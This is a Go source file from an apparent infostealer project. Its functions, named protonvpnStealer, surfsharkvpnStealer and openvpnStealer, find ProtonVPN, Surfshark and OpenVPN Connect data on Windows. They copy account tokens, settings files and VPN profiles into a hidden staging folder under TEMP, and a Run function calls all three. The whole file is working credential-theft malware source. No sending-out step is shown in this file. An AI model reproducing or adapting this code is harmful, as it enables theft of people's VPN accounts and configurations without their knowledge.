package vpn

import (
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"regexp"
	"Caca/pkg/common"
)

func protonvpnStealer() {
	protonvpnFolder := filepath.Join(os.Getenv("LOCALAPPDATA"), "ProtonVPN")
	if _, err := os.Stat(protonvpnFolder); os.IsNotExist(err) {
		return
	}

	protonvpnAccount := filepath.Join(folderVPN, "ProtonVPN")
	common.CreateDir(protonvpnAccount)

	pattern := regexp.MustCompile(`^ProtonVPN_Url_[A-Za-z0-9]+$`)

	err := filepath.Walk(protonvpnFolder, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			return err
		}

		if info.IsDir() && pattern.MatchString(info.Name()) {
			destinationPath := filepath.Join(protonvpnAccount, info.Name())
			common.CopyDir(path, destinationPath)
		}
		return nil
	})

	if err != nil {
		fmt.Println("Error copying ProtonVPN directories:", err)
	}
}

func surfsharkvpnStealer() {
	surfsharkvpnFolder := filepath.Join(os.Getenv("APPDATA"), "Surfshark")
	if _, err := os.Stat(surfsharkvpnFolder); os.IsNotExist(err) {
		return
	}

	surfsharkvpnAccount := filepath.Join(folderVPN, "Surfshark")
	common.CreateDir(surfsharkvpnAccount)

	files := []string{"data.dat", "settings.dat", "settings-log.dat", "private_settings.dat"}

	for _, file := range files {
		srcPath := filepath.Join(surfsharkvpnFolder, file)
		dstPath := filepath.Join(surfsharkvpnAccount, file)

		if _, err := os.Stat(srcPath); err == nil {
			common.CopyFile(srcPath, dstPath)
		}
	}
}

func openvpnStealer() {
	openvpnFolder := filepath.Join(os.Getenv("USERPROFILE"), "AppData", "Roaming", "OpenVPN Connect")
	if _, err := os.Stat(openvpnFolder); os.IsNotExist(err) {
		return
	}

	openvpnAccounts := filepath.Join(folderVPN, "OpenVPN")
	common.CreateDir(openvpnAccounts)

	profilesPath := filepath.Join(openvpnFolder, "profiles")
	if _, err := os.Stat(profilesPath); err == nil {
		common.CopyDir(profilesPath, openvpnAccounts)
	}

	configPath := filepath.Join(openvpnFolder, "config.json")
	if _, err := os.Stat(configPath); err == nil {
		common.CopyFile(configPath, openvpnAccounts)
	}
}

var folderVPN = filepath.Join(os.Getenv("TEMP"), strings.ToLower(os.Getenv("USERNAME")), "vpn")

func Run() {
	protonvpnStealer()
	surfsharkvpnStealer()
	openvpnStealer()
}